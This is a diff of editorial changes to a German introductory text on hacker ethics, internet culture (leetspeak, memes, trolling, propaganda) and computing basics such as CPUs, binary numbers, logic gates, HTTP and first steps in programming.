+Der letzte Punkt "Respekt verdienen" ist etwas schwieriger zu erklären. Früher hätte ich dazu "Fame" gesagt und behauptet, dass es darum geht möglichst der coolste Hacker von allen zu sein. Im Script Kiddie Bereich ist das durchaus üblich. Das ist hier aber nicht gemeint. Es geht dabei nicht um den Hack, sondern um dich als Person. Aufrichtig sein, zuhören und lernen, Empathie und Hilfe anbieten. Die Hacker-Ethik ernst nehmen. Verstehen, dass am anderen Ende der Leitung auch ein Mensch sitzt. Andere respektieren und sich deren Respekt damit verdienen. Das ist keine Einbahnstraße.
 
 Das ist ein Teil der Grundlagen:
 Verstehen wie der Computer funktionieren.
@@ -254,6 +255,7 @@ Wissen wie Netzwerke funktionieren.
 Wissen wie Signale und Kabel funktionieren.
 Messen von Signalen.
 Wissen wie das Internet funktioniert.
+Kryptografie grob verstehen.
 Communities im Internet kulturell verstehen.
 
 Du kannst mit deinem Wissen danach in der Open Source Community helfen und lernen, wie über das Internet an Software zusammen gearbeitet wird. Bugs (= Softwarefehler) beseitigen oder nützliches Wissen veröffentlichen. Du kannst danach gute Software schreiben und weißt, wie du immer besser dabei wirst. Du kannst danach dein Wissen für unterhaltsame Projekte verwenden, etwas löten, bauen und deine Projekte veröffentlichen. Du kannst danach auch nach Sicherheitslücken suchen, deren Ursachen ergründen, sie versuchen zu schließen, Software sicherer machen, womöglich auch Unrecht bekämpfen oder aufdecken.
@@ -282,7 +284,7 @@ Bei Netzkultur handelt es sich um eine Subkultur, die erst im Zusammenhang mit d
 
 Seitdem das Internet eine große Bedeutung in unserem Alltag gewonnen hat, vermischt sich die Netzkultur auch immer häufiger mit der Popkultur. Virale Videos werden in Nachrichtensendungen gezeigt und Tweets (Einträge auf Twitter) von Trump vorgelesen. Das Internet hat Musikgenres hervorgebracht und dient als Kommunikationsmittel bei Revolutionen. Ich könnte stundenlang weiter schwärmen und Beispiele liefern wieso bestimmte Inhalte oder Plattformen für die Menschen von besonderer Bedeutung sind.
 
-Bevor ich die dunklen Kapitel des Internets aufschlagen muss, schauen wir uns erst die lustigen Sachen an. Gehen wir ein paar Klassiker durch.
+Bevor ich die dunklen Kapitel des Internets aufschlagen muss, schauen wir uns erst die lustigen Sachen an. Als Hacker/-in solltest du vom Internet und seiner Kultur etwas wissen. Gehen wir ein paar Klassiker durch.
 
 Leetspeak
 Die Sprache der "Scriptkiddies". Hier werden Buchstaben durch ähnlich aussehende Zahlen oder andere Zeichen ersetzt. Ursprünglich wurde diese Technik benutzt, um Wort-Filter zu umgehen. Heute wird es häufig in selbstironischer Form benutzt, um die eigene Überlegenheit (gehören zur Elite) darzustellen und anderen zu imponieren. Das ist natürlich längst verpönt und wird deshalb nur noch als Scherz verwendet. Zu der Schreibweise kommt noch die Überspitzung mit Ausrufezeichen und Einsen, bei denen so getan wird, als würde der Schreiber die Shift-Taste zu früh loslassen. Das Resultat: !!!!!111
@@ -291,7 +293,7 @@ Kleines Leetspeak Alphabet in der einfachsten Variante mit Zahlen:
 A = 4
 E = 3
 T = 7
-S= 5
+S = 5
 L = 1
 usw.
 
@@ -299,9 +301,11 @@ Leetspeak = 13375P34K oder kurz 1337 (Leet) für Elite.
 
 Leetspeak spiegelt für mich die Situation wieder, in der  es auf der einen Seite eine IT-affine Gruppe (Elite) gibt und auf der anderen Seite normale Nutzer (auch DAUs = Dümmster Anzunehmender User), die internetfähige Geräte haben, damit aber nicht umgehen können.
 
-Bei all den Scherzen darüber liegt der Fehler hier nicht bei den Nutzern, sondern bei den Herstellern. Denn die sind eigentlich für die Sicherheit ihrer Geräte verantwortlich. Leider besitzen einige Hersteller von Unterhaltungselektronik keine Ansprüche an ihre Geräte, sodass diese möglichst wartungsfrei und sicher arbeiten. Das bedeutet im Endeffekt, dass die Nutzer/-innen praktisch die Leidtragenden sind.
+Bei all den Scherzen liegt der Fehler allerdings nicht bei den Nutzern/-innen, sondern bei den Herstellern. Denn die sind eigentlich für die Sicherheit ihrer Geräte verantwortlich. Leider besitzen einige Hersteller von Unterhaltungselektronik keine Ansprüche an ihre Geräte, sodass diese möglichst wartungsfrei und sicher arbeiten. Die rechtlichen Anforderungen halten sich auch in Grenzen. Das bedeutet im Endeffekt, dass die Nutzer/-innen die Leidtragenden sind.
 
-Ein Beispiel: Es ist nicht zwangsläufig der Fehler des Nutzers, dass er sich auf jeder Webseite ein neues Passwort ausdenken muss und deshalb auf einfache Kombinationen zurück greift. Warum macht der Browser es nicht für den Nutzer? Sodass sich dieser nur ein Passwort merken muss, für alle Webseiten? Eine lange Zeit hatte nur Apple in Safari und iOS eine Funktion, die ein zufälliges Passwort vorschlägt, einträgt und direkt speichert. Firefox hat nach Jahren endlich nachgezogen und hoffentlich wird es bald ein Standardverhalten von Webbrowsern. Es gäbe auch andere Ansätze um das gleiche Problem genauso bequem zu lösen. Auf der anderen Seite gibt es aber nicht mal Standards, die vorschreiben, dass besonders lange Passwörter überhaupt eingegeben werden können. Für mich wäre es nicht das erst mal, wenn mir eine Plattform sagt, dass mein Passwort zu lang wäre.
+Ein Beispiel: Es ist nicht zwangsläufig der Fehler des Nutzers, dass er sich auf jeder Webseite ein neues Passwort ausdenken muss und deshalb auf einfache Kombinationen zurück greift. Warum macht der Browser es nicht für den Nutzer? Sodass sich dieser nur ein Passwort merken muss, für alle Webseiten? Eine lange Zeit hatte nur Apple in Safari und iOS eine Funktion, die ein zufälliges Passwort vorschlägt, einträgt und direkt speichert.
+
+Firefox hat nach Jahren endlich nachgezogen und hoffentlich wird es bald ein Standardverhalten von Webbrowsern. Es gäbe auch andere Ansätze um das gleiche Problem genauso bequem zu lösen. Auf der anderen Seite gibt es aber nicht mal Standards, die vorschreiben, dass besonders lange Passwörter überhaupt eingegeben werden können. Für mich wäre es nicht das erst mal, wenn mir eine Plattform sagt, dass mein Passwort zu lang wäre.
 
 Es gibt typisches Scriptkiddie-Momente: Wenn es z.B. möglich wäre, sich mit dem Administrator-Account und "123456" oder "admin" anzumelden. User: "admin" und Passwort: "admin" ist übrigens bei vielen Geräten, die im Kapitel "Internet scannen" auftauchen das Default-Passwort. Wenn es nicht geändert wurde, kann so die Kontrolle über das Geräte übernommen werden. Es passt zum Humor von Leetspeak sich danach als "mächtiger Haxx0r" zu fühlen.
 
@@ -311,10 +315,6 @@ Kunst
 Wenn wir uns schon ansehen, was schönes im Internet passiert, ist die Kunst nicht weit. Künstlerische Werke können in vielfältiger Weise auf Computern oder im Internet entstehen und darüber verbreitet werden. Das reicht von Webseiten über Webcomics bis zur klassischen ASCII-Kunst.
 
 ASCII (American Standard Code for Information Interchange) ist eine Zeichenkodierung, mit der auch Logos, Figuren oder Schriftzüge dargestellt werden können. Hacker haben üblicherweise auch ihr eigenes Logo, was sie in ihre Textdateien packen, wenn sie Informationen, Scripte oder z.B. Exploits veröffentlichen.
-
-
-
-
 Hier ein Penrose-Dreieck in ASCII:
     ______________________
    /\                     \
@@ -341,7 +341,9 @@ Jedenfalls fand ich einen Klon im Web und habe das Spiel umprogrammiert. Statt d
 
 Code: https://codepen.io/leetcore/full/QqYRbp/
 
-An den Mini Games habe ich schon gemerkt, wie schlecht ich im Zeichnen bin, das hat mich aber nicht davon abgehalten ein paar Web Comics zu zeichnen. Meine Idee war damals das günstige iPad mit dem Apple Pencil zu kaufen. Als Anwendung reichte für den Anfang "Sketches" aus. Von den Comics habe ich am Ende nicht mal eine Hand voll gemalt. Meine erste Zeichnung hatte einen passenden Inhalt:
+An den Mini Games habe ich schon gemerkt, wie schlecht ich im Zeichnen bin, das hat mich aber nicht davon abgehalten ein paar Web Comics zu zeichnen. Meine Idee war damals das günstige iPad mit dem Apple Pencil zu kaufen. Als Anwendung reichte für den Anfang "Sketches" aus. Von den Comics habe ich am Ende nicht mal eine Hand voll gemalt.
+
+Meine erste Zeichnung hatte einen passenden Inhalt:
 
 
 
@@ -369,8 +371,8 @@ Memes (ein Internet Phänomen oder Hype) verbreiten sich auch immer schneller "a
 Das klassische Beispiel für ein Meme als Scherz ist "Rickrollen". Bei diesem Meme wird z.B. ein interessanter Linktext geschrieben, jemand klickt drauf, aber die nächste Webseite spielt nur "Never Gonna Give You Up" von Rick Astley ab.
 
 Weil der Songtext so schön ist:
-Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you
-Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you
+Never gonna give you upNever gonna let you downNever gonna run around and desert youNever gonna make you cryNever gonna say goodbyeNever gonna tell a lie and hurt you
+Never gonna give you upNever gonna let you downNever gonna run around and desert youNever gonna make you cryNever gonna say goodbyeNever gonna tell a lie and hurt you
 
 Memes sind eine gute Methode, um Inhalte auf lustige Art zu verbreiten. Das funktioniert als Insider-Witze, es funktioniert zum Thema Netzpolitik und es funktioniert leider auch bei Propaganda. Aber die schlimmeren Themen hebe ich mich für später auf. Auf gestalterische Weise lässt sich viel mit dem Netz tun, allerdings spielt auch immer wieder die Politik eine Rolle.
 
@@ -380,7 +382,6 @@ Netzpolitik ist ein breites Feld bei dem es um alle Themen der Digitalisierung, 
 Ein Beispiel für ein schlechtes Internetgesetz ist z.B. das "Cookie Law". Als Reaktion auf dieses Gesetz werden den Nutzer und Nutzerinnen auf jeder Webseite Info-Layer angezeigt, die einen Teil der Webseite verdecken und erklären sollen wieso Cookies gespeichert werden. Auf jeder Webseite erneut. Entweder gibt es einen Bestätigung oder die ganz dreiste Variante und die Besucher/-innen sollen die hunderte Partnernetzwerke zu Werbezwecken einzeln ablehnen. Das wird natürlich absichtlich so gebaut, damit Tracking möglichst aktiv bleibt. Bequem wäre es gewesen, wenn funktionale Cookies die Standardeinstellung geworden wären und nur bei zusätzlichen Cookies eine Meldung erscheinen muss. Noch besser wäre es, wenn diese Meldung nicht mehr angezeigt wird, weil über den Browser bereits mitgeteilt wurde, dass die Nutzer/-innen nicht getrackt werden wollen.
 
 "Do Not Track" ist der technische Lösungsvorschlag, den es bereits gab, aber an den sich niemand hält. Dieser Status kann mit dem Browser übertragen werden und damit hätte sich die Sache. Im Gesetzestext könnte festgelegt werden, dass auch diese Willenserklärung ausreicht, um nicht im WWW verfolgt zu werden und somit keine Werbecookies zu speichern. Stattdessen werden die Internetnutzer noch mehr genervt. Ich konnte es mir nicht verkneifen eine Webseite zu bauen, auf der unzählige Hinweisfenster geöffnet werden.
-
 
 
 Quelle: https://www.1337core.de/datenschutz/
@@ -432,7 +433,7 @@ Die Methoden des Trolls werden vor allem von rechten Gruppen übernommen, die da
 
 Um dem Ganzen etwas Positives abzugewinnen: Der Getrollte kann daraus auch einige Aspekte über sich selbst lernen. Zum Bespiel welche Diskussionen zu keinem Konsens mehr führen, dass Meinungen von anderen (vor allem Fremde Menschen im Internet) nicht so richtig relevant sind oder es hilft den Vorschuss an Vertrauen zu Fremden im Internet abzubauen. Das bedeutet, dass der/die Getrollte weniger Vertrauensvorschuss aufbringen wird, was bei drohenden Gefahren im Internet durchaus hilfreich sein kann. 
 
-Es ist ein guter Rat nicht alles zu glauben was auf einer Internetseite, einer Spam-Mail oder einem Popup steht. Außerdem kann er oder sie den ausgeworfenen Troll-Köder leichter erkennen, sobald eine Diskussion eine unfaire Ebene erreicht hat. Außerdem kann in Zukunft besser auf alltägliches Trolling reagiert werden. Es hilft auch einfach, die rhetorischen Tricks der Propaganda zu kennen. Diese Tricks sind nicht geheim. Ich beschäftige mich auch erst damit, seitdem mir das im Internet ständig vor die Füße fällt. Das destruktive Ausmaß lässt sich aber auch erst verstehen, wenn du die Zielscheibe davon warst.
+Es ist ein guter Rat nicht alles zu glauben was auf einer Internetseite, einer Spam-Mail oder einem Pop-up steht. Außerdem kann er oder sie den ausgeworfenen Troll-Köder leichter erkennen, sobald eine Diskussion eine unfaire Ebene erreicht hat. Außerdem kann in Zukunft besser auf alltägliches Trolling reagiert werden. Es hilft auch einfach, die rhetorischen Tricks der Propaganda zu kennen. Diese Tricks sind nicht geheim. Ich beschäftige mich auch erst damit, seitdem mir das im Internet ständig vor die Füße fällt. Das destruktive Ausmaß lässt sich aber auch erst verstehen, wenn du die Zielscheibe davon warst.
 
 4Chan
 Viele der Memes kamen von Imagesboards wie 4Chan, die sich anfangs mit Animes beschäftigt haben, aber aufgrund der Anonymität und immer weiteren Channels, wie /pol (politically incorrect) und /b (kein Thema, meistens Provokantes) zu einer Art Sumpf der Menschenverachtung im Internet wurden. Auf 4Chan ist /b mit Abstand der beliebteste Channel, was eindeutig dafür spricht, dass die Community nicht mehr viel für lustige Katzenfotos übrig hat.
@@ -467,7 +468,7 @@ Mit Rassisten diskutieren, das ist, wie mit einer Taube Schach spielen: Egal wie
 
 Das hinterlässt bei mir das traurige Fazit, dass die früher als öffentliche Meinung wahrgenommen "Internetgesellschaft" eigentlich nur eine Frage von Zeit (Anzahl der Kommentare) und Koordination (Fake-Accounts, liken eigener Beiträge durch eigene Accounts) war. Vor allem die Web 2.0 Features wie Kommentare von Besuchern haben damit eine hässliche Wendung genommen, was am Ende mehr schadet als nützt.
 
-Die Propaganda-Methoden dafür sind nicht neu oder geheim. Eine Internetsuche nach "Techniken der Propaganda und Meinungsmanipulation" bringt dir einen Wikipedia Artikel dazu, der über 80 rhetorische Beispiele aufzählt: Angsterzeugung, Brunnenvergiften, Tatsachenbehauptung, Desinformation, Framing und Neusprech. Außerdem gibt es auch eine "Liste von kognitiven Verzerrungen", mit sich die einige Fehlschlüsse erklären lassen. Die einfache Tatsachenbehauptung gehört dabei zu den wirksamsten Mitteln, was gerade bei Internetpropaganda sehr beliebt und effektiv ist. Ein typisches Beispiel ist mir aufgefallen bei einem "Loveparade 1997" Video von Viva veröffentlicht auf YouTube.
+Die Propaganda-Methoden dafür sind nicht neu oder geheim. Eine Internetsuche nach "Techniken der Propaganda und Meinungsmanipulation" bringt dir einen Wikipedia Artikel dazu, der über 80 rhetorische Beispiele aufzählt: Angsterzeugung, Brunnenvergiften, Tatsachenbehauptung, Desinformation, Framing und Neusprech. Außerdem gibt es auch eine "Liste von kognitiven Verzerrungen", mit sich die einige Fehlschlüsse erklären lassen. Die einfache Tatsachenbehauptung gehört dabei zu den wirksamsten Mitteln, was gerade bei Internetpropaganda sehr beliebt und effektiv ist. Ein typisches Beispiel ist mir bei einem "Loveparade 1997" Video auf YouTube aufgefallen.
 
 Nutzer-Kommentar:
 Die Welt war eindeutig eine bessere ohne Smartphones!
@@ -539,7 +540,7 @@ Die Plattformen verdienen Geld mit Werbung und je länger du auf ihrer Seite bis
 
 Facebook ist so "bedürftig" geworden, dass sie dir auch völligen Quatsch als Benachrichtigung zeigen, obwohl niemand auf deine Inhalte reagiert hat. Zum Beispiel irgendwelche Events, die gerade bei meinen Freunden beliebt sind. Der Hinweis, dass 4 Leute meine "Facebook Fanpage" angeklickt haben, die ich seit Jahren nicht mehr pflege und ähnliche Dinge. Freundschaftsvorschläge oder ein Hinweis, dass eine Bekannte, die ich seit 15 Jahren nicht mehr gesehen habe, ein neues Fotos gepostet hatte. Auf Facebook konnte ich prima üben und unwichtige Benachrichtigungen gekonnt zu ignorieren.
 
-Das WWW hat nicht nur zu einer Journalismus Krise geführt, sondern die Vergütung von Webseiten basiert hauptsächlich auf der Anzahl der Klicks auf einen Artikel. Was zu immer emotionalisierten Überschriften und "Clickbaiting" (Klickfutter) geführt hat.
+Das WWW hat nicht nur zu einer Journalismus Krise geführt, sondern die Vergütung von Webseiten basiert hauptsächlich auf der Anzahl der Klicks auf einen Artikel. Was zu immer emotionalisierten Überschriften und Clickbaiting (Klickfutter) geführt hat.
 
 10 Gründe, weshalb dein Freund mit dir Schluss machen wird. Nummer 4 wird dich schockieren.
 
@@ -550,10 +551,10 @@ Clickbaiting Titel sind Headlines, die dich zum Klicken bewegen sollen. Das füh
 Die populärsten Plattformen (Facebook, YouTube, Twitter) sind auf maximale Werbeeinnahmen optimiert, deshalb werden sowieso schon viel angeklickte Inhalte gerne noch prominenter dargestellt. Alles um die Nutzungszeit so lang wie möglich zu strecken.
 
 Technische Mechanismen dafür:
-Instagram: Unendliches Scrollen ist möglich, es werden nur Likes dargestellt, Hashtags erhöhen die Sichtbarkeit (Spam), kopiert Features anderer Plattformen (Snapchat Videofilter, Stories).
-Facebook: Unendliches Scrollen ist möglich, es werden Likes dargestellt, sinnlose Benachrichtigungen werden angezeigt, kopiert Features anderer Plattformen (Kleinanzeigen, Veranstaltungen, Gruppen oder Snapchat Videofilter, Stories).
-YouTube: Bewertungen werden bei der Suche nicht angezeigt, nur die Anzahl der Aufrufe sind relevant, einmal angeklickte Videos, bringen immer wieder die gleichen Themen in die Empfehlungen, völlig egal, ob der Nutzer das Video davor gut fand. Thumbnails können selbst hochgeladen werden und müssen nicht dem Inhalt entsprechen.
-Twitter: Unendliches Scrollen ist möglich, mehrere Accounts sind leicht erstellt, unnötige Benachrichtigungen, Hashtagspam für höhere Sichtbarkeit, Spam-Bots folgen Personen, die Hashtags posten.
+Instagram:Unendliches Scrollen ist möglich, es werden nur Likes dargestellt, Hashtags erhöhen die Sichtbarkeit (Spam), kopiert Features anderer Plattformen (Snapchat Videofilter, Stories).
+Facebook:Unendliches Scrollen ist möglich, es werden Likes dargestellt, sinnlose Benachrichtigungen werden angezeigt, kopiert Features anderer Plattformen (Kleinanzeigen, Veranstaltungen, Gruppen oder Snapchat Videofilter, Stories).
+YouTube:Bewertungen werden bei der Suche nicht angezeigt, nur die Anzahl der Aufrufe sind relevant, einmal angeklickte Videos, bringen immer wieder die gleichen Themen in die Empfehlungen, völlig egal, ob der Nutzer das Video davor gut fand. Thumbnails können selbst hochgeladen werden und müssen nicht dem Inhalt entsprechen.
+Twitter:Unendliches Scrollen ist möglich, mehrere Accounts sind leicht erstellt, unnötige Benachrichtigungen, Hashtagspam für höhere Sichtbarkeit, Spam-Bots folgen Personen, die Hashtags posten.
 
 Wenn ein Inhalt nicht mehr erreichbar ist, wird schnell von Zensur gesprochen. Doch ist es wirklich Zensur, wenn der neuste Film von Brad Pitt aus dem Internet gelöscht wurde?
 
@@ -571,7 +572,7 @@ Bausteine für klassische Aufklärung im Zeitalter des Internets:
 Welche Reaktion will der/die Autor/-in?
 Warum will er/sie diese Reaktion?
 Verbreite Nachrichten niemals weiter, nicht mal um dich darüber lustig zu machen.
-Erkenne Manipulation: Unrealistische Vergleiche, negative Assoziationen, ständiges Ablenken bei Gegenargumenten. Behauptungen ohne Belege. Lösungsvorschläge bieten, die alle schlecht und übertrieben sind, aber andere Lösungen ausblenden.
+Erkenne Manipulation:Unrealistische Vergleiche, negative Assoziationen, ständiges Ablenken bei Gegenargumenten. Behauptungen ohne Belege. Lösungsvorschläge bieten, die alle schlecht und übertrieben sind, aber andere Lösungen ausblenden.
 Wie soll ich über diese Sache denken, welcher Grund steckt dahinter?
 Was sind Behauptungen von Fremden ohne Belege wert?
 Welchen Einfluss haben "Meinungen" im Internet überhaupt auf mich?
@@ -606,8 +607,6 @@ Das sind Veranstaltungen für Kinder und Jugendliche, die dort oft ihre ersten P
 In diesen Dojos wird mit einfachen Logikaufgaben begonnen, die spielerisch gelöst werden sollen. Dazu gehört z.B. einen linearen Programmablauf zu verstehen und auch einfache Wiederholungen. Die erweiterte Variante davon ist Scratch. Das ist ein Editor für kleine Animationen oder Spiele. Es gibt vorgefertigte Figuren und Formen, die in einer Blocksprache programmiert werden können. Es gibt logische Blöcke, die verschachtelt werden. Dafür ist keine Zeile spezieller Syntax zu schreiben.
 
 Jedes Projekt ist offen und kann "geremixed" (als Kopie bearbeitet) werden. Mein erstes Spiel ist ein Taucher, der Diamanten sammeln musste. Ein Scoreboard zählt mit. Gesteuert wird mit der Maus, der Taucher schwimmt automatisch zum Mauszeiger.
-
-
 
 Quelle: https://scratch.mit.edu/projects/302562690/
 
@@ -718,22 +717,19 @@ Die Grafikkarte kommt in den Slot Richtung Gehäuse-Rückseite, damit auch der M
 Die Festplatten haben auch entsprechend große Rahmen an der Vorderseite. Strom und Datenkabel für das Mainboard anschließen.
 
 CPU
-Wenn wir uns mit Prozessoren beschäftigen wollen, müssen wir den Aufbau verstehen und danach die Abarbeitung eines Programms im Zusammenspiel mit dem RAM. Es stellt sich erstmal die Frage, woher wir diese Informationen bekommen. Wie immer ist Wikipedia zwar ein Einstieg ins Thema, es hilft aber leider wenig zum Verständnis. Mein Einstieg war der Artikel auf Wikipedia, der mir immerhin sagen konnte aus was ein Prozessor besteht. Zum besseren Verständnis, wie am Ende die Kommunikation wirklich abläuft, hilft das Video "See How a CPU Works" auf YouTube. Dadurch wird klarer wie in einem Prozessor gearbeitet wird. Die bessere schriftliche Einführung fand ich durch eher typische Überschriften im Universitätsumfeld und dem Zusatz "PDF". Eine gute Erklärung mit Schaubildern konnte ich mit dem "Einführung in Aufbau und Funktionsweise von Mikroprozessoren PDF" finden. Suchmaschine befeuern und lesen!
+Wenn wir uns mit Prozessoren beschäftigen wollen, müssen wir den Aufbau verstehen und danach die Abarbeitung eines Programms im Zusammenspiel mit dem RAM. Es stellt sich erstmal die Frage, woher wir diese Informationen bekommen. Wie immer ist Wikipedia zwar ein Einstieg ins Thema, es hilft aber leider wenig zum Verständnis. Mein Einstieg war der Artikel auf Wikipedia, der mir immerhin sagen konnte aus was ein Prozessor besteht. Zum besseren Verständnis, wie am Ende die Kommunikation wirklich abläuft, hilft das Video "See How a CPU Works" auf YouTube. Dadurch wird klarer wie in einem Prozessor gearbeitet wird. Die bessere schriftliche Einführung fand ich durch eher typische Überschriften im Universitätsumfeld und dem Zusatz "PDF". Eine gute Erklärung mit Schaubildern konnte ich mit dem "Einführung in Aufbau und Funktionsweise von Mikroprozessoren PDF" finden. Suchmaschine befeuern und lesen!
 
 Funktionsgruppen:
 Steuerwerk (= Control Unit). Liest und interpretiert Programminstruktionen aus dem Speicher Schritt für Schritt und gibt Befehle an das Rechenwerk weiter. Diese Programminstruktionen erhält das Steuerwerk in Maschinensprache. Der Compiler erzeugt aus einem in einer höheren Programmiersprache (C, C++, Rust, usw.) geschrieben Quellcode (= Source Code) diese Maschinensprache.
 Rechenwerk mit ALU, die arithmetisch-logische Einheit, die Berechnungen durchführt. Da kommen Eingaben rein und am Ende ein Ergebnis der Berechnung heraus. Das Steuerwerk sorgt dafür, dass die richtigen Eingabewerte anliegen und die passende Berechnung dafür ausgeführt wird.
 Register sind schnelle Zwischenspeicher für das Steuerwerk. Zwischenergebnisse müssen schließlich irgendwo gespeichert werden.
 Das interne Bussystem bestehend aus Daten- und Adressbus. Das sind Datenleitungen, die z.B. Ergebnisse aus dem Rechenwerk zurück ins Steuerwerk bringen. Es wird Bussystem genannt, weil mehrere Teilnehmer an die Datenleitungen angeschlossen sind. Allerdings kann immer nur eine Datenübertragung stattfinden, sonst würden Teilnehmer sich gegenseitig stören. Als Metapher wäre das ein echter Bus mit immer nur einer Person drin, die sehr schnell zwischen verschiedenen Bushaltestellen pendelt. ;)
-
 Die kleinste Einheit entspricht einem Bit. In der Schule lernte ich das als Strom an oder Strom aus. Ein Bit wird dargestellt als 0 oder 1. Das reicht für unsere Zwecke eigentlich auch.
 
 Das Bit
 Der Name Bit wurde aus "binary digit" zusammengesetzt. 8 Bit werden zu einem Byte zusammengefasst. Datenmengen werden damit gemessen. Üblicherweise denken wir in Dezimalzahlen von 0 bis 9. Wir haben aber nur 0 oder 1 zur Verfügung. Was uns auf Binärzahlen (Dualsystem, Zweiersystem) beschränkt. Bei Binärzahlen sind die Position und Länge wichtig. Stellenwertsystem mit der Basis 2. Wikipedia hilft, wie immer.
 
-Jede Position einer Binärzahl hat eine festgelegte Wertigkeit. Diese Werte werden addiert und damit wieder ins Dezimalsystem umgewandelt.
-
-Nehmen wir die Zahl 9 als Beispiel. Die Binärzahl würde 1001 lauten. Die Wertigkeit steigert sich potenziell für jede Position. Die niedrigste Stelle steht rechts und die Werte werden nach links potenziert. Spätestens wenn die Potenz bei 32, 64, 128 oder 256 angekommen ist, merkst du wieso Speichermedien in genau diesen Größen angegeben werden.
+Jede Position einer Binärzahl hat eine festgelegte Wertigkeit. Diese Werte werden addiert und damit wieder ins Dezimalsystem umgewandelt. Nehmen wir die Zahl 9 als Beispiel: Die Binärzahl würde 1001 lauten. Die Wertigkeit steigert sich potenziell für jede Position. Die niedrigste Stelle steht rechts und die Werte werden nach links potenziert. Spätestens wenn die Potenz bei 32, 64, 128 oder 256 angekommen ist, merkst du wieso Speichermedien in genau diesen Größen angegeben werden.
 
 Zurück zum Beispiel:
 
@@ -754,7 +750,7 @@ Die visuelle Variante davon findet sich auf YouTube mit "Dial Up Modem Handshake
 Wer Interesse an einem Messgerät hat, um Signale an Leitungen zu analysieren, der sollte sich nach "USB Oszilloskop BitScope" umsehen. Mir persönlich war es zum Ausprobieren allerdings zu teuer und das war schon eines der günstigen Produkte.
 
 Logische Verknüpfungen
-Nachdem wir über Signalen und dem Binärsystem gesprochen haben, kommen wir zu einem weiteren wichtigen Teil, der uns auf kommende Aufgaben vorbereiten soll: Logische Schaltungen. Logik Gatter verarbeiten ein  oder mehr binäre Eingangssignale zu einem Ausgangssignal. Wikipedia hilft und hat auch schöne Beispiele im Artikel zu "Logikgatter".
+Nachdem wir über Signalen und dem Binärsystem gesprochen haben, kommen wir zu einem weiteren wichtigen Teil, der uns auf kommende Aufgaben vorbereiten soll: Logische Schaltungen. Logik Gatter verarbeiten ein oder mehr binäre Eingangssignale zu einem Ausgangssignal. Wikipedia hilft und hat auch schöne Beispiele im Artikel zu "Logikgatter".
 
 AND = Und.
 Beispiel:1 AND 1 = 1
@@ -782,7 +778,7 @@ XNOR = Exklusive Nicht Oder.
 Eine gerade Anzahl der Eingänge müssen 1 oder 0 sein, um am Ausgang 1 zu bekommen.
 Beispiel: 1 XNOR 1 = 1.
 
-Das reicht als Einstieg. Wer Informatik studiert oder studiert hat, darf sich mit boolescher Algebra beschäftigen. Wichtig um später Bedingungen zu schreiben sind logische Operatoren. Da kommen noch Vergleiche wie größer, kleiner, größer oder gleich, kleiner oder gleich, gleich und ungleich hinzu.
+Das reicht als Einstieg. Wer Informatik studiert oder studiert hat, darf sich mit boolesche Algebra beschäftigen. Wichtig um später Bedingungen zu schreiben sind logische Operatoren. Da kommen noch Vergleiche wie größer, kleiner, größer oder gleich, kleiner oder gleich, gleich und ungleich hinzu.
 
 Wer wissen möchte wie die Schaltung aussehen würde, schaut sich den Artikel "Logische Verknüpfung" auf Wikipedia an. Wer wissen möchte welche Operatoren die gewählte Programmiersprache direkt beherrscht, findet später im Kapitel "Programmieren lernen" antworten.
 
@@ -883,7 +879,7 @@ Als Antwort vom Webserver werden verschiedene Statuscodes mitgesendet, um die An
 
 
 
-Wikipedia hat eine recht übersichtliche Liste: https://de.wikipedia.org/wiki/HTTP-Statuscode. Die offizielle Dokumentation von HTTP/1.1 gibt es als RFC. Dort stehen Methoden, Statuscodes und alles was HTTP betrifft drin: https://tools.ietf.org/html/rfc2616#section-10. Nachdem jetzt grob die Infrastruktur und Protokolle erklärt wurden, machen wir einen Exkurs in die Welt von Linux.
+Wikipedia hat eine recht übersichtliche Liste: https://de.wikipedia.org/wiki/HTTP-Statuscode. Die offizielle Dokumentation von HTTP/1.1 gibt es als RFC. Dort stehen Methoden, Statuscodes und alles über HTTP: https://tools.ietf.org/html/rfc2616#section-10. Nachdem jetzt grob die Infrastruktur und Protokolle erklärt wurden, machen wir einen Exkurs in die Welt von Linux.
 
 —
 Linux
@@ -965,7 +961,7 @@ Um die Logik in einem Programmablauf zu lernen, helfen einige Lernspiele. Lernsp
 
 Auf www.code.org gibt es einfache Tutorials für Kinder und Jugendliche. Wer ganz neu Programmieren lernen möchte, sollte diese Aufgaben meistern können. Dabei geht es um Schleifen, Logik und Ablauf.
 
-Wer sich durch die Anleitungen im Netz liest, wird oft etwas von PHP als Einstiegssprache hören. Gerade im Bereich "Programmieren lernen" tut sich sehr viel. Die Einstiegshürden wurden gesenkt und du musst nicht nur noch trockene Dokumentationen lesen. Da PHP auf sehr vielen Webservern läuft werde ich exemplarisch damit anfangen. Zu vielen Programmiersprachen gibt es auch interaktive Tutorials im Internet. Wer direkt mit der Syntax anfangen möchte findet mit "php interactive tutorial" entsprechende Lerndienste.
+Wer sich durch die Anleitungen im Netz liest, wird oft etwas von PHP als Einstiegsprache hören. Gerade im Bereich "Programmieren lernen" tut sich sehr viel. Die Einstiegshürden wurden gesenkt und du musst nicht nur noch trockene Dokumentationen lesen. Da PHP auf sehr vielen Webservern läuft werde ich exemplarisch damit anfangen. Zu vielen Programmiersprachen gibt es auch interaktive Tutorials im Internet. Wer direkt mit der Syntax anfangen möchte findet mit "php interactive tutorial" entsprechende Lerndienste.
 
 Ich erkläre kurz wie ich neue Programmiersprachen lerne: Der erste Schritt ist sich erstmal auf Wikipedia und lese mir grob durch wofür diese Sprache gut ist. Was kann sie besser als andere? Im nächsten Schritt schaue ich mir deren offizielle Webseite an und lese was sie dort als erwähnenswert erachten. Danach öffne ich die offizielle Dokumentation und gehe grob über das Inhaltsverzeichnis drüber. Dort bekomme ich einen ersten Eindruck von der Syntax, welche Features die Sprache hat und welche Standardfälle die Sprache direkt abdecken kann. Wichtig ist auch, wie gut die Dokumentation geschrieben wurde.
 
@@ -1148,7 +1144,7 @@ Nun habe ich aber immer noch keine Ahnung wie genau diese Programmiersprache fun
 
 Cargo kümmert sich um abhängige Pakete, die vor allem in der richtigen Version installiert werden müssen.
 
